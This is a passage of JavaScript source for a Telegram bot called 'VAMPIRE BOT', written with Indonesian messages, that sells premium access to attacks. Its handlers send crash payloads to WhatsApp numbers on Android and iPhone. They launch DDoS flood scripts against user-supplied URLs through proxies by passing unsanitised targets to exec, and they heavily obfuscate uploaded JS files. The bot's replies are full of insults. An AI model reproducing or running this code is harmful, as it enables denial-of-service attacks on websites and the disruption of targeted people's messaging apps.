  bot.sendPhoto(chatId, "https://files.catbox.moe/a51xhx.jpg", { 
    caption: `
┏━━『  𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐂𝐫𝐚𝐬𝐡  』━━┓
┃⪼ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
┗━━━━━━━━━━━━━━━━━━━━━┛`,
    parse_mode: "HTML",
    ...options
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const [action, jid] = data.split(":") || [];

  // --- Menu Handler ---
  if (data === "BugMenu") {
    const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
   𝗕  𝗨  𝗚  -  𝗟  𝗜  𝗦  𝗧
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /AndroidAttack 62xxx
┃ 𖢄 /iPhoneAttack 62xxx
┗━━━━━━━━━━━━━━━━━━━━━━┛
    𝗪  𝗔  𝗥  𝗡  𝗜  𝗡  𝗚
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ Apabila ada ke erroran 
┃ dalam bot ini,
┃ wajib lapor pada penjual
┃ atau developer langsung
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
    return bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/a51xhx.jpg",
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
        ]
      }
    }, { chat_id: chatId, message_id: messageId });
  }

  if (data === "DDoSMenu") {
    const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
 𝗗  𝗗  𝗢  𝗦  -  𝗟  𝗜  𝗦  𝗧
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /PterodactylAtt <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /BypassLink <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /ServerDown <Uʀʟ> <Tɪᴍᴇ>
┃ 𖢄 /DomMethode <Uʀʟ> <Tɪᴍᴇ>
┗━━━━━━━━━━━━━━━━━━━━━━┛
    𝗪  𝗔  𝗥  𝗡  𝗜  𝗡  𝗚
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ Apabila ada ke erroran 
┃ dalam bot ini,
┃ wajib lapor pada penjual
┃ atau developer langsung
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
    return bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/a51xhx.jpg",
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
        ]
      }
    }, { chat_id: chatId, message_id: messageId });
  }

  if (data === "ToolsMenu") {
    const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
  𝗢 𝗧 𝗛 𝗘 𝗥  -  𝗠 𝗘 𝗡 𝗨
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /ListPrem
┃ 𖢄 /Cooldown
┃ 𖢄 /Groupset
┃ 𖢄 /DelBug
┃ 𖢄 /EncryptHard
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
    return bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/a51xhx.jpg",
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
        ]
      }
    }, { chat_id: chatId, message_id: messageId });
  }

  if (data === "OwnerArea") {
    const caption = `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢇 Bᴏᴛ ɴᴀᴍᴇ : VAMPIRE BOT
┃ 𖢇 Vᴇʀsɪᴏɴ  : 12.0
┃ 𖢇 Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
┗━━━━━━━━━━━━━━━━━━━━━━┛
  𝗢 𝗪 𝗡 𝗘 𝗥  -  𝗠 𝗘 𝗡 𝗨
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ 𖢄 /AddPrem
┃ 𖢄 /DelPrem
┃ 𖢄 /AddAdmin
┃ 𖢄 /DelAdmin
┃ 𖢄 /PairingNumber
┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``;
    return bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/a51xhx.jpg",
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "https://t.me/Vampiresagara" }],
        ]
      }
    }, { chat_id: chatId, message_id: messageId });
  }

  // --- BUG FUNCTION Handler ---
  if (action?.includes("Vamp")) {
    try {
      if (sessions.size === 0) {
        return bot.sendMessage(
          chatId,
          "Gak Ada Nomor Yang Terhubung Goblok!!!\nHubungkan Dulu : /PairingNumber 62xxx"
        );
      }

      await bot.editMessageMedia(
        {
          type: "photo",
          media: "https://files.catbox.moe/a51xhx.jpg",
          caption: `Vampire Bot Sedang Proses Mengirim Bug...`,
          parse_mode: "HTML"
        },
        { chat_id: chatId, message_id: messageId }
      );

      setTimeout(async () => {
        try {
          await bot.deleteMessage(chatId, messageId);
          await bot.sendPhoto(
            chatId,
            "https://files.catbox.moe/a51xhx.jpg",
            {
              caption: `\`\`\`
┏━⪩ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ⪨━┓
┃ Tᴀʀɢᴇᴛ :
┃ ${jid}
┃ Note : Di Jeda Ya 5 menit
┗━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
              parse_mode: "Markdown"
            }
          );
        } catch (error) {
          bot.sendMessage(chatId, `❌ Error hapus/kirim pesan: ${error.message}`);
        }
      }, 3000);

      let bugType;
      const session = sessions.values().next().value;
      if (!session) throw new Error("Session tidak ditemukan!");

      if (action === "VampOri") {
        await VampHardCrash(session, jid);
        await VampEasyDelay(session, jid);
        bugType = "Crash WhatsApp Ori";
        
      } else if (action === "VampBeta") {
        await VampEasyDelay(session, jid);
        bugType = "Crash WhatsApp Beta";
        
      } else if (action === "VampBussiness") {
        await VampMediumCrash(session, jid);
        await VampEasyDelay(session, jid);
        bugType = "Crash WhatsApp Business";
        
      } else if (action === "VampiPhone") {
        await VampCrashiPhone(session, jid);
        await VampNotif(session, jid);
        bugType = "Crash WhatsApp iPhone";
        
      } else if (action === "VampUi") {
        await VampNotif(session, jid);
        await VampEasyDelay(session, jid);
        bugType = "Crash Notification";
        
      } else if (action === "VampInvisible") {
        await VampEasyDelay(session, jid);
        await VampEasyDelay(session, jid);
        bugType = "Blank WhatsApp System";
        
      } else {
        return bot.sendMessage(chatId, "❌ Unknown action.");
      }

    } catch (error) {
      bot.sendMessage(chatId, `❌ Gagal Mengirim Bug: ${error.message}`);
    }
  }

  // Jawab callback-nya biar tombol gak loading terus
  bot.answerCallbackQuery(callbackQuery.id);
});
//=======DDOS=======//
const { exec } = require('child_process');
const processes = {};
const timeLimit = 10000;
bot.onText(/^\/BypassLink (.+) (\d+)$/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const target = match[1];
    const time = parseInt(match[2], 10);
    const isOwnerUser = isOwner(senderId);
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const isAllowed = isOwnerUser || isPremium;

    if (!isAllowed) {
      return bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    }

    if (isNaN(time) || time > timeLimit) {
      return bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    }

    const cmd = `node DDoSArea/bypass.js ${target} ${time} 35 10 proxy.txt`;
    const process = exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error.message}`);
      }
    });

    if (!processes[chatId]) processes[chatId] = [];
    processes[chatId].push(process);

    const message = `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: VampBypass\nStatus: Owner`;

    bot.sendMessage(chatId, message);
  } catch (err) {
    console.error('Error in /BypassLink command:', err);
    bot.sendMessage(msg.chat.id, 'Terjadi kesalahan, coba lagi nanti.');
  }
});
bot.onText(/^\/PterodactylAtt (.+) (\d+)$/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const target = match[1];
    const time = parseInt(match[2], 10);
    const isOwnerUser = isOwner(senderId);
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const isAllowed = isOwnerUser || isPremium;

    if (!isAllowed) {
      return bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    }

    if (isNaN(time) || time > timeLimit) {
      return bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    }

    const cmd = `node DDoSArea/Vampire.js ${target} ${time} 35 10 proxy.txt`;
    const process = exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error.message}`);
      }
    });

    if (!processes[chatId]) processes[chatId] = [];
    processes[chatId].push(process);

    const message = `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: VampBypass\nStatus: Owner`;

    bot.sendMessage(chatId, message);
  } catch (err) {
    console.error('Error in /PterodactylAtt command:', err);
    bot.sendMessage(msg.chat.id, 'Terjadi kesalahan, coba lagi nanti.');
  }
});
bot.onText(/^\/DomMethode (.+) (\d+)$/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const target = match[1];
    const time = parseInt(match[2], 10);
    const isOwnerUser = isOwner(senderId);
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const isAllowed = isOwnerUser || isPremium;

    if (!isAllowed) {
      return bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    }

    if (isNaN(time) || time > timeLimit) {
      return bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    }

    const cmd = `node DDoSArea/Vampcrack.js ${target} ${time} 35 10 proxy.txt`;
    const process = exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error.message}`);
      }
    });

    if (!processes[chatId]) processes[chatId] = [];
    processes[chatId].push(process);

    const message = `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: VampWeb\nStatus: Owner`;

    bot.sendMessage(chatId, message);
  } catch (err) {
    console.error('Error in /DomMethode command:', err);
    bot.sendMessage(msg.chat.id, 'Terjadi kesalahan, coba lagi nanti.');
  }
});
bot.onText(/^\/ServerDown (.+) (\d+)$/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const target = match[1];
    const time = parseInt(match[2], 10);
    const isOwnerUser = isOwner(senderId);
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const isAllowed = isOwnerUser || isPremium;

    if (!isAllowed) {
      return bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    }

    if (isNaN(time) || time > timeLimit) {
      return bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    }

    const cmd = `node DDoSArea/VampKill.js ${target} ${time} 35 10 proxy.txt`;
    const process = exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error.message}`);
      }
    });

    if (!processes[chatId]) processes[chatId] = [];
    processes[chatId].push(process);

    const message = `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: VampLink\nStatus: Owner`;

    bot.sendMessage(chatId, message);
  } catch (err) {
    console.error('Error in /ServerDown command:', err);
    bot.sendMessage(msg.chat.id, 'Terjadi kesalahan, coba lagi nanti.');
  }
});
//=======plugins=======//
bot.onText(/\/PairingNumber (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️WARNING!!!\nLu Siapa Anjing\nLu Gak ada Hak Gunain Command Ini..",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in PairingNumber:", error);
    bot.sendMessage(
      chatId,
      "Gagal Menghubungkan Bre...\nServer Error"
    );
  }
});



const moment = require('moment');


bot.onText(/\/AddPrem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "Lu Bukan Owner Ngentot!!!.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "Durasinya Mana Goblok!!!\nContoh : /AddPrem <ID> 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Durasinya Salah Bego!!!\nContoh : /AddPrem <ID> 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ ID nya Salah Woy!!!\nContoh : /AddPrem <ID> 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Lu Bego Apa Idiot?\nMasih Salah itu\nIni Caranya d (days), h (hours), or m (minutes).\nContoh : 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} Menambahkan Si Anjing Inj ${userId}\nMenjadi Premium Hingga : ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ Si Yatim Ini : ${userId} Berhasil Mendapatkan Access Hingga : ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ Si Yatim Ini : ${userId}\nSudah Menjadi Premium\nHingga : ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/ListPrem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Gak Punya Access Ngentot!!!");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "List Premium Masih Kosong...");
  }

  let message = "『  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌  』\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Durasi : ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/^\/DelBug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }

    const q = match && match[1] ? match[1].trim() : null;
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\nContoh: /DelBug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (!pepec.startsWith("62")) {
        return bot.sendMessage(chatId, `Contoh : /DelBug 62xxx`);
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "𝗩𝗔𝗠𝗣𝗜𝗥𝗘 𝗖𝗟𝗘𝗔𝗥 𝗕𝗨𝗚\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝗩𝗔𝗠𝗣𝗜𝗥𝗘 𝗖𝗟𝗘𝗔𝗥 𝗕𝗨𝗚";

    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { text: clearBugText });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Vampire!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/EncryptHard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /EncryptHard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    try {
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
        const codeBuffer = Buffer.from(response.data);
        const codeString = codeBuffer.toString();

        // Validasi syntax JS
        try {
            new Function(codeString); // Cek sintaks JavaScript
        } catch (err) {
            return bot.sendMessage(chatId, `❌ Gagal Encrypt: File mengandung syntax error!\n\n🧠 Pesan error:\n${err.message}`);
        }

        // Simpan sementara
        const tempFilePath = `./@VampEnc${fileName}`;
        fs.writeFileSync(tempFilePath, codeBuffer);

        // Enkripsi kode
        bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Vampire Encryptnya...");
        const obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,
            identifierGenerator: function () {
                const originalString = "9898V4MP1R39898" + "9898V4MP1R39898";
                function removeUnwantedChars(input) {
                    return input.replace(/[^a-zA-Z9898V4MP1R39898]/g, '');
                }
                function randomString(length) {
                    let result = '';
                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                    return result;
                }
                return removeUnwantedChars(originalString) + randomString(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.0,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,
            shuffle: { hash: 0.0, true: 0.0 },
            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 0.9,
            deadCode: 0.0,
            dispatcher: true,
            rgf: false,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true
        });

        // Simpan hasil encrypt
        const encryptedFilePath = `./@VampEnc${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode);

        // Kirim ke user
        bot.sendDocument(chatId, encryptedFilePath, {
            caption: `\`\`\`
❒━━━━━━⌦ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌫━━━━━━❒
┃  𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗖𝗹𝗲𝗮𝗿 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗙𝗶𝗹𝗲
❒━━━━━━━━━━━━━━━━━━━━━━❒\`\`\``,
            parse_mode: "Markdown"
        });

    } catch (err) {
        console.error("❌ Error Encrypt:", err);
        bot.sendMessage(chatId, `❌ Error Saat Encrypt: ${err.message}`);
    }
});
//=====================================
bot.onText(/\/AddAdmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh : /addadmin <ID>.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh : /AddAdmin <ID>");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Menambah Anjing Ini : ${userId} Menjadi Admin`);
        bot.sendMessage(chatId, `✅ Si Binatang Ini : ${userId} \nBerhasil Menjadi Admin`);
    } else {
        bot.sendMessage(chatId, `❌ Si Binatang Ini : ${userId} \nSudah Di List Admin`);
    }
});

bot.onText(/\/DelPrem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Ngentot!!!");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ ID nya Mana Tolol\nContoh : /DelPrem <ID>");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ ID Harus Berupa Angka Bego...");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ Si Babi Ini ${userId} Gak Ada Di List Premium.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ Si Babi Ini ${userId}\nBerhasil Di Hapus Dari List Premium.`);
});

bot.onText(/\/DelAdmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️WARNING!!!\nLu Siapa Ngentot\nLu Gak Ada Hak Gunain Command Ini",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ ID nya mana Bego\nContoh : /DelAdmin <ID>.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh : /DelAdmin <ID>");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Menghapus ${userId} Binatang ini Dari List Admin`);
        bot.sendMessage(chatId, `✅ Si Babi Ini ${userId} \nBerhasil Di Hapus Dari Admin.`);
    } else {
        bot.sendMessage(chatId, `❌ Si Babi Ini ${userId} Bukan Admin`);
    }
});